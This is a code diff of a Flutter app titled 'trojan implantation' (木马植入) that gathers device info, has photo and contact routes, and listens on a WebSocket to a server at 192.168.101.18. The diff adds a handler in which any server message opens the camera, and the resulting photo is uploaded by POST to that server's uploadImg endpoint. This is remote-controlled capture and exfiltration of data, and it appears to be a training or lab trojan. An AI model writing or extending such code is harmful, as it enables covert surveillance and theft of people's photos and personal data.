@@ -7,8 +7,8 @@ import './routes/contact.dart';
 import 'package:web_socket_channel/io.dart';
 import 'package:device_info/device_info.dart';
 import 'package:image_picker/image_picker.dart';
-import 'package:adaptive_dialog/adaptive_dialog.dart';
-
+// import 'package:adaptive_dialog/adaptive_dialog.dart';
+import 'package:dio/dio.dart';
 void main() {
   // runApp(const MyApp());
   runApp(const MaterialApp(
@@ -46,7 +46,7 @@ class MyApp extends StatelessWidget {
 
 class MyStatefulWidget extends StatefulWidget {
   const MyStatefulWidget({Key? key}) : super(key: key);
-  
+
   @override
   _MyStatefulWidgetState createState() => _MyStatefulWidgetState();
 }
@@ -55,20 +55,34 @@ class _MyStatefulWidgetState extends State<MyStatefulWidget> {
   int _selectedIndex = 0;
   static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
   Map<String, dynamic> _deviceData = <String, dynamic>{};
-  var _imgPath;
-  var channel ;
+  // bool flag = false;
   final List _widgetOptions = [
     const HomePage(),
     const PermissionPhoto(),
     const FlutterContactsExample(),
   ];
 
-  void _onItemTapped(int index) {
+  void _onItemTapped(int index) async {
+    // if(Global.name == '') {
+    //   var res = await showTextInputDialog(
+    //     context: context,
+    //     textFields: const [
+    //       DialogTextField(
+    //         hintText: ''
+    //       )
+    //     ],
+    //     message: '请输入您的名字',
+    //     okLabel: '确认',
+    //     cancelLabel: '取消',
+    //   );
+    //   print(res);
+    // }
     setState(() {
       _selectedIndex = index;
       // Navigator.pushNamed(context, _widgetOptions[index]);
     });
   }
+
   Future<void> initPlatformState() async {
     Map<String, dynamic> deviceData = <String, dynamic>{};
 
@@ -146,12 +160,8 @@ class _MyStatefulWidgetState extends State<MyStatefulWidget> {
   void initState() {
     super.initState();
     initPlatformState();
-    // showTextAnswerDialog(
-    //   context: context,
-    //   keyword: ''
-    // );
-    channel =
-        IOWebSocketChannel.connect(Uri.parse('ws://192.168.101.18:8019/yzxa-api/websocket/appSocket'));
+    var channel = IOWebSocketChannel.connect(
+        Uri.parse('ws://192.168.101.18:8019/yzxa-api/websocket/appSocket'));
     channel.stream.listen((message) {
       _takePhoto();
     });
@@ -160,59 +170,53 @@ class _MyStatefulWidgetState extends State<MyStatefulWidget> {
   @override
   Widget build(BuildContext context) {
     return WillPopScope(
-      onWillPop: () async { 
+      onWillPop: () async {
         print('退出');
         return true;
-       },
+      },
       child: Scaffold(
-        appBar: AppBar(
-          title: const Text('木马植入'),
-          leading: const Icon(Icons.home),
-          backgroundColor: Colors.blue[700],
-          centerTitle: true,
+          appBar: AppBar(
+            title: const Text('木马植入'),
+            leading: const Icon(Icons.home),
+            backgroundColor: Colors.blue[700],
+            centerTitle: true,
           ),
-        body: Stack(
-          children: [
-            Offstage(
-              offstage: _selectedIndex != 0,
-              child: _widgetOptions[0],
-            ),
-            Offstage(
-              offstage: _selectedIndex != 1,
-              child: _widgetOptions[1],
-            ),
-            Offstage(
-              offstage: _selectedIndex != 2,
-              child: _widgetOptions[2],
-            ),
-          ]),
-        bottomNavigationBar: BottomNavigationBar(
-          items: const <BottomNavigationBarItem>[
-            BottomNavigationBarItem(
-              icon: Icon(Icons.home),
-              label: 'Home',
-            ),
-            BottomNavigationBarItem(
-              icon: Icon(Icons.photo_album),
-              label: 'Photo',
-            ),
-            BottomNavigationBarItem(
-              icon: Icon(Icons.contact_page),
-              label: 'Contact',
-            ),
-          ],
-          currentIndex: _selectedIndex,
-          backgroundColor: Colors.blue[700],
-          selectedItemColor: Colors.white,
-          onTap: _onItemTapped,
-        )),
+          body: _widgetOptions[_selectedIndex],
+          bottomNavigationBar: BottomNavigationBar(
+            items: const <BottomNavigationBarItem>[
+              BottomNavigationBarItem(
+                icon: Icon(Icons.home),
+                label: 'Home',
+              ),
+              BottomNavigationBarItem(
+                icon: Icon(Icons.photo_album),
+                label: 'Photo',
+              ),
+              BottomNavigationBarItem(
+                icon: Icon(Icons.contact_page),
+                label: 'Contact',
+              ),
+            ],
+            currentIndex: _selectedIndex,
+            backgroundColor: Colors.blue[700],
+            selectedItemColor: Colors.white,
+            onTap: _onItemTapped,
+          )),
     );
   }
+
   _takePhoto() async {
     var image = await ImagePicker().pickImage(source: ImageSource.camera);
-
-    setState(() {
-      _imgPath = image;
-    });
+    if(image != null) {
+      try {
+        var dio = Dio();
+          var res = await dio.post('http://192.168.101.18:8019/yzxa-api/app/uploadImg', data: FormData.fromMap({
+              'file': await MultipartFile.fromFile(image.path, filename: image.name)
+            }));
+          print(res.data);
+        } catch(e) {
+          print(e);
+        }
+    }
   }
 }
